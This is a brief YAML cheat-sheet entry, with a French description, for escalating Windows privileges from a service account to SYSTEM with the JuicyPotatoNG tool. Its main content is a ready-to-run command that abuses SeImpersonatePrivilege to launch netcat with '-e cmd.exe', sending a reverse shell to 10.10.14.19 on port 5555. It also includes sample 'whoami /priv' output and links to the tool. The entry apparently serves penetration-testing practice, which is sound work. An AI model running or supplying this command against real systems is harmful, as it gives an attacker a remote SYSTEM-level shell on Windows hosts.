---
description: |
  Encore une escalade des privilèges locaux de Windows d'un compte de service vers le système. Nécessite 'whoami /priv' SeImpersonatePrivilege.

  Command Reference:

    -t createprocess call: both (*)

    -p <program>: nc.exe

    -a <argument>: 10.10.14.19 5555 -e cmd.exe

command: |
  JuicyPotatoNG.exe -t * -p "nc.exe" -a "10.10.14.19 5555 -e cmd.exe"

code: |
  SeImpersonatePrivilege        Impersonate a client after authentication   Enabled 

items:
  - Shell
services:
  - 
OS:
  - Windows
  - Approved-tool
attack_types:
  - PrivEsc
references:
  - https://github.com/antonioCoco/JuicyPotatoNG
  - https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505
---